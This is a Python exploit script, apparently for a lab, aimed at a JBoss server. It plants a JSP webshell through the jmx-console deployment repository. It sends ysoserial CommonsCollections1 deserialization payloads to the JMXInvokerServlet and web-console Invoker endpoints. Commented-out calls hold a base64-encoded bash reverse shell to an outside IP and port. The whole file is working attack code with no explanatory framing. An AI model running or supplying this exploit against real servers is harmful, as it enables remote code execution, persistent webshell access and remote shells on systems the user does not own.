import requests

URL = 'http://192.168.162.133:8080'


def exec(command):
    import subprocess
    return subprocess.check_output(['java', '-jar',
                                    'ysoserial-all.jar', 'CommonsCollections1', command])


def jmx_console(cmd=None):
    from urllib.parse import quote as url_encode
    print("\n\n\nEndpoint /jmx-console")
    url = URL + "/jmx-console/HtmlAdaptor"
    jsp = url_encode(open('simpleshell.jsp').read())
    payload = ("?action=invokeOpByName&name=jboss.admin:service="
               "DeploymentFileRepository&methodName=store&argType=java.lang.String&arg0="
               "webshell.war&argType=java.lang.String&arg1=webshell&argType=java.lang.St"
               "ring&arg2=.jsp&argType=java.lang.String&arg3=" + jsp + "&argType=boolean&arg4=True")
    print(requests.get(url + payload).text)

    if cmd is None:
        cmd = 'id'
    print(requests.get(URL + f'/webshell/webshell.jsp?cmd={cmd}').text)
    input("Enter để tiếp tục")


def JMXInvokerServlet(cmd=None):
    print("\n\n\nEndpoint /invoker/JMXInvokerServlet")
    url = URL + "/invoker/JMXInvokerServlet"
    if cmd is None:
        cmd = open('gnome-calculator.cc1.ser', 'rb').read()
    else:
        cmd = exec(cmd)
    print(requests.post(url, data=cmd, allow_redirects=False).text)
    input("Enter để tiếp tục")


def invoker(cmd=None):
    print("\n\n\nEndpoint /web-console/Invoker")
    url = URL + "/web-console/Invoker"
    if cmd is None:
        cmd = open('gnome-calculator.cc1.ser', 'rb').read()
    else:
        cmd = exec(cmd)
    print(requests.post(url, data=cmd, allow_redirects=False).text)
    input("Enter để tiếp tục")


def main():
    jmx_console()
    JMXInvokerServlet()
    invoker()
    # JMXInvokerServlet('bash -c {echo,c2ggLWkgPiYgL2Rldi90Y3AvMTcyLjMxLjE1MC4xODMvOTAwMSAwPiYx}|{base64,-d}|{bash,-i}')
    # invoker('bash -c {echo,c2ggLWkgPiYgL2Rldi90Y3AvMTcyLjMxLjE1MC4xODMvOTAwMSAwPiYx}|{base64,-d}|{bash,-i}')


if __name__ == '__main__':
    main()
